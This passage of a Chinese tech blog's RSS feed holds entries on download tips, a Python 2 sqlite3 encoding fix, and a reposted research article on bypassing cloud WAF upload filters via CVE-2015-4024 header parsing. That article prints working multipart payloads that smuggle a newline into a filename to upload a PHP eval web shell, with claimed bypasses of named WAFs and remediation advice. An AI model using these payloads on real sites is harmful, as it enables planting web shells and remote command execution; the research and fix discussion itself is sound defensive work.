&lt;h1 id=&quot;首先下载IDM-最好支持正版&quot;&gt;&lt;a href=&quot;#首先下载IDM-最好支持正版&quot; class=&quot;headerlink&quot; title=&quot;首先下载IDM(最好支持正版)&quot;&gt;&lt;/a&gt;首先下载IDM(最好支持正版)&lt;/h1&gt;&lt;p&gt;下载链接：&lt;br&gt;&lt;a href=&quot;https://eyun.baidu.com/s/3nvg3jdf&quot;&gt;百度云shaoit&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;开始下载：&quot;&gt;&lt;a href=&quot;#开始下载：&quot; class=&quot;headerlink&quot; title=&quot;开始下载：&quot;&gt;&lt;/a&gt;开始下载：&lt;/h1&gt;&lt;p&gt;一般的话，小文件直接打开浏览器就可以下载&lt;/p&gt;
&lt;h1 id=&quot;大文件下载：&quot;&gt;&lt;a href=&quot;#大文件下载：&quot; class=&quot;headerlink&quot; title=&quot;大文件下载：&quot;&gt;&lt;/a&gt;大文件下载：&lt;/h1&gt;&lt;p&gt;首先在chrome浏览器中装上一个User-Agent Switcher for (Google)Chrome插件,然后选择安卓手机，也就是打开这个的手机页面，然后直接用IDM下载&lt;/p&gt;
&lt;h1 id=&quot;批量下载与外链获取&quot;&gt;&lt;a href=&quot;#批量下载与外链获取&quot; class=&quot;headerlink&quot; title=&quot;批量下载与外链获取&quot;&gt;&lt;/a&gt;批量下载与外链获取&lt;/h1&gt;&lt;p&gt;使用这个脚本，具体看链接内介绍&lt;/p&gt;
    
    </summary>
    
      <category term="life" scheme="http://akkuman.coding.me/categories/life/"/>
    
    
      <category term="life" scheme="http://akkuman.coding.me/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>ProgrammingError: You must not use 8-bit bytestrings...</title>
    <link href="http://akkuman.coding.me/2016/12/06/ProgrammingError-You-must-not-use-8-bit-bytestrings.html"/>
    <id>http://akkuman.coding.me/2016/12/06/ProgrammingError-You-must-not-use-8-bit-bytestrings.html</id>
    <published>2016-12-06T06:31:14.000Z</published>
    <updated>2016-12-06T06:32:55.911Z</updated>
    
    <content type="html"><![CDATA[<h1 id="问题出现："><a href="#问题出现：" class="headerlink" title="问题出现："></a>问题出现：</h1><p>You must not use 8-bit bytestrings unless you use a text_factory that can interpret 8-bit bytestrings (like text_factory = str). It is highly recommended that you instead just switch your application to Unicode strings.</p>
<h1 id="产生原因："><a href="#产生原因：" class="headerlink" title="产生原因："></a>产生原因：</h1><p>问题在用Python的sqlite3操作数据库要插入的字符串中含有非ascii字符时产生，做插入的时候就报当前这个错误。</p>
<h1 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h1><h2 id="1-按提示"><a href="#1-按提示" class="headerlink" title="1. 按提示"></a>1. 按提示</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">connection = sqlite3.connect(...)</div><div class="line">connection.text_factory = str</div></pre></td></tr></table></figure>
<p>但是如果字符中出现非ascii字符，那么依然不能解决问题，会产生不可预知的乱码，这样可以参考 2</p>
<h2 id="2-以utf8的编码格式进行解码转为unicode编码做插入"><a href="#2-以utf8的编码格式进行解码转为unicode编码做插入" class="headerlink" title="2. 以utf8的编码格式进行解码转为unicode编码做插入"></a>2. 以utf8的编码格式进行解码转为unicode编码做插入</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">cursor.execute(<span class="string">'''</span></div><div class="line">    INSERT INTO JAVBUS_DATA (姓名, 年龄)</div><div class="line">    VALUES (?, ?)</div><div class="line">    ''', (<span class="string">'张三'</span>.decode(<span class="string">'utf-8'</span>), <span class="string">'22岁'</span>.decode(<span class="string">'utf-8'</span>)))</div></pre></td></tr></table></figure>
<p>但是如果数据太长，这样一个一个敲挺麻烦的，下面是一个使用map函数简化的小例子</p>
<a id="more"></a>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*-coding:utf-8-*-</span></div><div class="line"><span class="keyword">import</span> sqlite3</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_utf8</span><span class="params">(aStr)</span>:</span></div><div class="line">    <span class="keyword">return</span> aStr.decode(<span class="string">'utf-8'</span>)</div><div class="line"></div><div class="line">conn = sqlite3.connect(<span class="string">"something.db"</span>)</div><div class="line">cursor = conn.cursor()</div><div class="line"></div><div class="line">cursor.execute(<span class="string">'''</span></div><div class="line">    CREATE TABLE IF NOT EXISTS JAVBUS_DATA(</div><div class="line">        id       INT PRIMARY KEY,</div><div class="line">        姓名     TEXT,</div><div class="line">        年龄     TEXT);''')</div><div class="line"><span class="keyword">print</span> <span class="string">"Table created successfully"</span></div><div class="line">cursor.execute(<span class="string">'''</span></div><div class="line">    INSERT INTO JAVBUS_DATA (姓名, 年龄)</div><div class="line">    VALUES (?, ?)</div><div class="line">    ''', map(decode_utf8, (<span class="string">'张三'</span>, <span class="string">'22岁'</span>)))</div><div class="line"></div><div class="line">cursor.close()</div><div class="line">conn.commit()</div><div class="line">conn.close()</div></pre></td></tr></table></figure>
<h1 id="其他注意："><a href="#其他注意：" class="headerlink" title="其他注意："></a>其他注意：</h1><p>有时用第二种方法会出现UnicodeDecodeError<br>加入#-<em>-coding:utf-8-</em>-<br>还是不行请sys指定编码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sys  </div><div class="line">reload(sys)  </div><div class="line">sys.setdefaultencoding(<span class="string">'utf8'</span>)</div></pre></td></tr></table></figure></p>
<p><strong>这个问题在python3应该不会出现，python2编码问题，仅作记录</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;问题出现：&quot;&gt;&lt;a href=&quot;#问题出现：&quot; class=&quot;headerlink&quot; title=&quot;问题出现：&quot;&gt;&lt;/a&gt;问题出现：&lt;/h1&gt;&lt;p&gt;You must not use 8-bit bytestrings unless you use a text_factory that can interpret 8-bit bytestrings (like text_factory = str). It is highly recommended that you instead just switch your application to Unicode strings.&lt;/p&gt;
&lt;h1 id=&quot;产生原因：&quot;&gt;&lt;a href=&quot;#产生原因：&quot; class=&quot;headerlink&quot; title=&quot;产生原因：&quot;&gt;&lt;/a&gt;产生原因：&lt;/h1&gt;&lt;p&gt;问题在用Python的sqlite3操作数据库要插入的字符串中含有非ascii字符时产生，做插入的时候就报当前这个错误。&lt;/p&gt;
&lt;h1 id=&quot;解决方法：&quot;&gt;&lt;a href=&quot;#解决方法：&quot; class=&quot;headerlink&quot; title=&quot;解决方法：&quot;&gt;&lt;/a&gt;解决方法：&lt;/h1&gt;&lt;h2 id=&quot;1-按提示&quot;&gt;&lt;a href=&quot;#1-按提示&quot; class=&quot;headerlink&quot; title=&quot;1. 按提示&quot;&gt;&lt;/a&gt;1. 按提示&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;connection = sqlite3.connect(...)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;connection.text_factory = str&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但是如果字符中出现非ascii字符，那么依然不能解决问题，会产生不可预知的乱码，这样可以参考 2&lt;/p&gt;
&lt;h2 id=&quot;2-以utf8的编码格式进行解码转为unicode编码做插入&quot;&gt;&lt;a href=&quot;#2-以utf8的编码格式进行解码转为unicode编码做插入&quot; class=&quot;headerlink&quot; title=&quot;2. 以utf8的编码格式进行解码转为unicode编码做插入&quot;&gt;&lt;/a&gt;2. 以utf8的编码格式进行解码转为unicode编码做插入&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;cursor.execute(&lt;span class=&quot;string&quot;&gt;&#39;&#39;&#39;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    INSERT INTO JAVBUS_DATA (姓名, 年龄)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    VALUES (?, ?)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &#39;&#39;&#39;&lt;/span&gt;, (&lt;span class=&quot;string&quot;&gt;&#39;张三&#39;&lt;/span&gt;.decode(&lt;span class=&quot;string&quot;&gt;&#39;utf-8&#39;&lt;/span&gt;), &lt;span class=&quot;string&quot;&gt;&#39;22岁&#39;&lt;/span&gt;.decode(&lt;span class=&quot;string&quot;&gt;&#39;utf-8&#39;&lt;/span&gt;)))&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但是如果数据太长，这样一个一个敲挺麻烦的，下面是一个使用map函数简化的小例子&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="http://akkuman.coding.me/categories/Python/"/>
    
    
      <category term="Python" scheme="http://akkuman.coding.me/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>WAF攻防研究之四个层次Bypass WAF</title>
    <link href="http://akkuman.coding.me/2016/09/25/WAF%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6%E4%B9%8B%E5%9B%9B%E4%B8%AA%E5%B1%82%E6%AC%A1Bypass-WAF.html"/>
    <id>http://akkuman.coding.me/2016/09/25/WAF攻防研究之四个层次Bypass-WAF.html</id>
    <published>2016-09-25T09:06:30.000Z</published>
    <updated>2016-09-25T09:13:42.655Z</updated>
    
    <content type="html"><![CDATA[<h1 id="绝对值得一看的技术文章"><a href="#绝对值得一看的技术文章" class="headerlink" title="绝对值得一看的技术文章"></a>绝对值得一看的技术文章</h1><p><a href="http://7xusrl.com1.z0.glb.clouddn.com/WAF%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6%E4%B9%8B%E5%9B%9B%E4%B8%AA%E5%B1%82%E6%AC%A1Bypass%20WAF.pdf" target="_blank" rel="external">pdf下载链接</a></p>
<p><em>[via@<a href="http://weibo.com/ttarticle/p/show?id=2309404007261092631700" target="_blank" rel="external">破-见</a> ]</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;绝对值得一看的技术文章&quot;&gt;&lt;a href=&quot;#绝对值得一看的技术文章&quot; class=&quot;headerlink&quot; title=&quot;绝对值得一看的技术文章&quot;&gt;&lt;/a&gt;绝对值得一看的技术文章&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://7xusrl.com1.z0.glb
    
    </summary>
    
      <category term="Hacker" scheme="http://akkuman.coding.me/categories/Hacker/"/>
    
    
      <category term="Hacker" scheme="http://akkuman.coding.me/tags/Hacker/"/>
    
  </entry>
  
  <entry>
    <title>PHP DOS漏洞的新利用：CVE-2015-4024 Reviewed</title>
    <link href="http://akkuman.coding.me/2016/09/24/PHP-DOS%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%96%B0%E5%88%A9%E7%94%A8%EF%BC%9ACVE-2015-4024-Reviewed.html"/>
    <id>http://akkuman.coding.me/2016/09/24/PHP-DOS漏洞的新利用：CVE-2015-4024-Reviewed.html</id>
    <published>2016-09-24T05:20:39.000Z</published>
    <updated>2016-09-25T09:10:36.645Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-背景介绍"><a href="#1-背景介绍" class="headerlink" title="1.     背景介绍"></a>1.     背景介绍</h1><p>今天我们想从2015.04.03的一个PHP远程dos漏洞（CVE-2015-4024）说起。技术细节见如下链接，<a href="https://bugs.php.net/bug.php?id=69364" target="_blank" rel="external">https://bugs.php.net/bug.php?id=69364</a>。因为php解析body part的header时进行字符串拼接，而拼接过程重复拷贝字符导致DOS。事实上该漏洞还有其他非dos的利用价值，其中之一，就是绕过当前各种云WAF的文件上传防御策略。</p>
<p>目前国内外流行的云WAF厂商有如百度云加速，360网站卫士，加速乐，云盾等。因为PHP远程dos漏洞及PHP官方修复方案的特点，我们成功利用该漏洞绕过了当前主流WAF的文件上传防御，例如百度云加速、360网站卫士、知道创于加速乐、安全狗。</p>
<p>接下来，我们以PHP为例，详细解析我们的绕过方法。</p>
<h1 id="2-绕过WAF的原理"><a href="#2-绕过WAF的原理" class="headerlink" title="2.     绕过WAF的原理"></a>2.     绕过WAF的原理</h1><p>根据PHP DOS漏洞原理，在multipart_buffer_headers函数解析header对应value时，value值存在n行。每行的字符串以空白符开头或不存字符’:’，都触发以下合并value的代码块。那么解析header的value就要执行(n-1)次合并value的代码块，从而导致DOS。</p>
<a id="more"></a>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">prev_len= strlen(prev_entry.value);</div><div class="line"></div><div class="line">cur_len= strlen(line);</div><div class="line"></div><div class="line">entry.value= emalloc(prev_len + cur_len + <span class="number">1</span>); <span class="comment">//1次分片内存</span></div><div class="line"></div><div class="line">memcpy(entry.value,prev_entry.value, prev_len); <span class="comment">//1次拷贝</span></div><div class="line"></div><div class="line">memcpy(entry.value+ prev_len, line, cur_len);   <span class="comment">//1次拷贝</span></div><div class="line"></div><div class="line">entry.value[cur_len+ prev_len] = <span class="string">'\0'</span>;</div><div class="line"></div><div class="line">entry.key= estrdup(prev_entry.key);</div><div class="line"></div><div class="line">zend_llist_remove_tail(header);<span class="comment">//1次内存释放</span></div></pre></td></tr></table></figure>
<p>而PHP官方修复方案，在进行合并时，避免重复拷贝，从而避免DOS。绕过WAF的关键在于，PHP multipart_buffer_headers函数解析header对应value时，value值存在多行。每行的字符串以空白符开头或不存字符’:’，将进行合并。而WAF在解析文件上传的文件名时，没有考虑协议兼容，不进行多行合并，就可以被绕过。</p>
<p>根据原理构造绕过WAF文件上传防御的payload，WAF解析到的文件名为”test3.jpg”，而PHP解析到的文件名是”test3.jpg\nf/shell.php”，因为”/”是目录分隔符，上传的文件名变为shell.php。以下是绕过paylaod、测试脚本、paylaod进行文件上传的效果图。</p>
<h2 id="WAF绕过payload"><a href="#WAF绕过payload" class="headerlink" title="WAF绕过payload:"></a>WAF绕过payload:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">------WebKitFormBoundaryx7V4AhipWn8ig52y</div><div class="line"></div><div class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test3.jpg\nsf/shell.php</div><div class="line"></div><div class="line">Content-Type: application/octet-stream</div><div class="line"></div><div class="line">&lt;?php eval($_GET[&apos;c&apos;])?&gt;</div><div class="line"></div><div class="line">------WebKitFormBoundaryx7V4AhipWn8ig52y</div></pre></td></tr></table></figure>
<h2 id="文件上传功能测试脚本："><a href="#文件上传功能测试脚本：" class="headerlink" title="文件上传功能测试脚本："></a>文件上传功能测试脚本：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">         $name = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> $name;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">"\n"</span>;</div><div class="line"></div><div class="line">        move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>] , <span class="string">'/usr/local/nginx/html/upload/'</span>.$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">"upload success! "</span>.$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">"\n"</span>;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> strlen($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>Payload能够正常上传</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6apwul8mrj30r50fptbm.jpg" alt="1"></p>
<h1 id="3-绕过WAF实战"><a href="#3-绕过WAF实战" class="headerlink" title="3.     绕过WAF实战"></a>3.     绕过WAF实战</h1><p>笔者通过搭建自己的测试站，接入360网站卫士和加速乐，验证绕过WAF文件上传防御的方法。</p>
<h2 id="3-1-绕过360网站卫士"><a href="#3-1-绕过360网站卫士" class="headerlink" title="3.1 绕过360网站卫士"></a>3.1 绕过360网站卫士</h2><h3 id="步骤1，验证网站已被360网站卫士防御，拦截了直接上传PHP文件的请求。"><a href="#步骤1，验证网站已被360网站卫士防御，拦截了直接上传PHP文件的请求。" class="headerlink" title="步骤1，验证网站已被360网站卫士防御，拦截了直接上传PHP文件的请求。"></a>步骤1，验证网站已被360网站卫士防御，拦截了直接上传PHP文件的请求。</h3><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6apy2esg5j311v0ifdjx.jpg" alt="2"></p>
<h3 id="步骤2：成功绕过360网站卫士，上传shell成功，文件是apo-php。在该请求中，有没有Content-Type不影响绕过。"><a href="#步骤2：成功绕过360网站卫士，上传shell成功，文件是apo-php。在该请求中，有没有Content-Type不影响绕过。" class="headerlink" title="步骤2：成功绕过360网站卫士，上传shell成功，文件是apo.php。在该请求中，有没有Content-Type不影响绕过。"></a>步骤2：成功绕过360网站卫士，上传shell成功，文件是apo.php。在该请求中，有没有Content-Type不影响绕过。</h3><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6apztziwvj30vm0g9af6.jpg" alt="3"></p>
<h2 id="3-2-绕过知道创宇加速乐"><a href="#3-2-绕过知道创宇加速乐" class="headerlink" title="3.2 绕过知道创宇加速乐"></a>3.2 绕过知道创宇加速乐</h2><h3 id="步骤一：验证网站被加速乐保护，拦截了直接上传PHP文件的请求。"><a href="#步骤一：验证网站被加速乐保护，拦截了直接上传PHP文件的请求。" class="headerlink" title="步骤一：验证网站被加速乐保护，拦截了直接上传PHP文件的请求。"></a>步骤一：验证网站被加速乐保护，拦截了直接上传PHP文件的请求。</h3><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6aq0sw1luj30wb0f9wjf.jpg" alt="4"></p>
<h3 id="步骤二：成功绕过加速乐，上传shell，文件是syt-php。"><a href="#步骤二：成功绕过加速乐，上传shell，文件是syt-php。" class="headerlink" title="步骤二：成功绕过加速乐，上传shell，文件是syt.php。"></a>步骤二：成功绕过加速乐，上传shell，文件是syt.php。</h3><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6aq1mvbrqj30vr0elwh2.jpg" alt="5"></p>
<h2 id="3-3-绕过百度云加速"><a href="#3-3-绕过百度云加速" class="headerlink" title="3.3. 绕过百度云加速"></a>3.3. 绕过百度云加速</h2><p>百度云加速与CloudFlare，从百度匀加速拦截页面可以看出使用的是CloudFlare. 但是估计有本地化，百度云加速应该是百度和CloudFlare共同产物吧。测试百度没有搭建自己的测试环境，找了个接入了百度云加速的站进行测试。</p>
<h3 id="步骤一：验证网站被百度云加速保护，拦截了直接上传PHP文件的请求。"><a href="#步骤一：验证网站被百度云加速保护，拦截了直接上传PHP文件的请求。" class="headerlink" title="步骤一：验证网站被百度云加速保护，拦截了直接上传PHP文件的请求。"></a>步骤一：验证网站被百度云加速保护，拦截了直接上传PHP文件的请求。</h3><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6aq30m0wjj31050etdko.jpg" alt="6"></p>
<h3 id="步骤二：成功绕过云加速"><a href="#步骤二：成功绕过云加速" class="headerlink" title="步骤二：成功绕过云加速"></a>步骤二：成功绕过云加速</h3><p>同上</p>
<h1 id="4-扩展—更多的工作"><a href="#4-扩展—更多的工作" class="headerlink" title="4.     扩展—更多的工作"></a>4.     扩展—更多的工作</h1><h2 id="4-1-分析filename其他字符的绕过"><a href="#4-1-分析filename其他字符的绕过" class="headerlink" title="4.1 分析filename其他字符的绕过"></a>4.1 分析filename其他字符的绕过</h2><p>同理，我们发现除了双引号外，使用单引号也能绕过WAF的防御，并实现文件上传。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">------WebKitFormBoundaryx7V4AhipWn8ig52y</div><div class="line"></div><div class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&apos;test3.jpg\nsf/shell.php</div><div class="line"></div><div class="line">Content-Type: application/octet-stream</div><div class="line"></div><div class="line">&lt;?php eval($_GET[&apos;c&apos;])?&gt;</div><div class="line"></div><div class="line">------WebKitFormBoundaryx7V4AhipWn8ig52y</div></pre></td></tr></table></figure>
<h2 id="4-2-分析其他应用脚本语言"><a href="#4-2-分析其他应用脚本语言" class="headerlink" title="4.2 分析其他应用脚本语言"></a>4.2 分析其他应用脚本语言</h2><p>我们也发现jsp解析也有自己的特点，同时可被用于绕过WAF。暂时未测试asp,aspx,python等常用的WEB应用脚本语言。</p>
<h1 id="5-修复方案"><a href="#5-修复方案" class="headerlink" title="5.     修复方案"></a>5.     修复方案</h1><h2 id="5-1-修复方案一"><a href="#5-1-修复方案一" class="headerlink" title="5.1 修复方案一"></a>5.1 修复方案一</h2><p>解析文件上传请求时，如果发现请求不符合协议规范，则拒绝请求。可能会产生误拦截，需要评估误拦截的影响范围。</p>
<h2 id="5-2-修复方案二"><a href="#5-2-修复方案二" class="headerlink" title="5.2 修复方案二"></a>5.2 修复方案二</h2><p>兼容php的文件解析方式，解析文件名时，以单引号或双引号开头，并且对应的单引号双引号闭合。</p>
<h1 id="6-总结"><a href="#6-总结" class="headerlink" title="6.     总结"></a>6.     总结</h1><p>本文通过Review PHP远程dos漏洞(CVE-2015-4024)，并利用该特性绕过现有WAF的文件上传防御，成功上传shell。 更重要的价值，提供给我们一个绕过WAF的新思路，一种研究新方向：利用后端应用脚本与WAF行为的差异绕过WAF的防御。总的来说，一款优秀的WAF应该能够处理兼容WEB应用容器、标准协议、web服务器这间的差异。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-背景介绍&quot;&gt;&lt;a href=&quot;#1-背景介绍&quot; class=&quot;headerlink&quot; title=&quot;1.     背景介绍&quot;&gt;&lt;/a&gt;1.     背景介绍&lt;/h1&gt;&lt;p&gt;今天我们想从2015.04.03的一个PHP远程dos漏洞（CVE-2015-4024）说起。技术细节见如下链接，&lt;a href=&quot;https://bugs.php.net/bug.php?id=69364&quot;&gt;https://bugs.php.net/bug.php?id=69364&lt;/a&gt;。因为php解析body part的header时进行字符串拼接，而拼接过程重复拷贝字符导致DOS。事实上该漏洞还有其他非dos的利用价值，其中之一，就是绕过当前各种云WAF的文件上传防御策略。&lt;/p&gt;
&lt;p&gt;目前国内外流行的云WAF厂商有如百度云加速，360网站卫士，加速乐，云盾等。因为PHP远程dos漏洞及PHP官方修复方案的特点，我们成功利用该漏洞绕过了当前主流WAF的文件上传防御，例如百度云加速、360网站卫士、知道创于加速乐、安全狗。&lt;/p&gt;
&lt;p&gt;接下来，我们以PHP为例，详细解析我们的绕过方法。&lt;/p&gt;
&lt;h1 id=&quot;2-绕过WAF的原理&quot;&gt;&lt;a href=&quot;#2-绕过WAF的原理&quot; class=&quot;headerlink&quot; title=&quot;2.     绕过WAF的原理&quot;&gt;&lt;/a&gt;2.     绕过WAF的原理&lt;/h1&gt;&lt;p&gt;根据PHP DOS漏洞原理，在multipart_buffer_headers函数解析header对应value时，value值存在n行。每行的字符串以空白符开头或不存字符’:’，都触发以下合并value的代码块。那么解析header的value就要执行(n-1)次合并value的代码块，从而导致DOS。&lt;/p&gt;
    
    </summary>
    
      <category term="Hacker" scheme="http://akkuman.coding.me/categories/Hacker/"/>
    
    
      <category term="Hacker" scheme="http://akkuman.coding.me/tags/Hacker/"/>
    
  </entry>
  
</feed>
